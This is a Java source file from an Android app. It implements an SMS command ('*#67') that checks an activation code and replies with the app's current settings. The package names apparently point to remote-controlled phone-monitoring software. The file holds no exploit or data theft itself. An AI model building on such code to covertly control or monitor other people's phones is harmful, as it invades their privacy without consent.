package com.vvt.android.syncmanager.smscommand.interpreter;

import android.content.Context;

import com.fx.dalvik.resource.StringResource;
import com.fx.dalvik.util.FxLog;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.smscommand.SmsCommandHelper;

public class SmsGetCurrentSettings {

	private static final String TAG = "SmsGetCurrentSettings";
	private static final boolean DEBUG = true;
 	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	
	public static final String COMMAND_ID = "*#67";
	
//	<*#67><FK>
	public static String processCommand(Context context, String[] tokens) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "processCommand # Enter ..");
		}
		
		// Check command format
		boolean debugTagValidation = 
				   (tokens.length == 2 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 3 && SmsCommandHelper.isEndWithDebugTag(tokens));
		
		if (!debugTagValidation) {
			return String.format("%s\n%s",
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = 
			SmsCommandHelper.getActivationCodeValidation(tokens[1]);
		
		if (!activationCodeValidation.equals(StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		
		return StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK + "\n" 
				+ SmsCommandHelper.getCurrentSettings();
	}
}
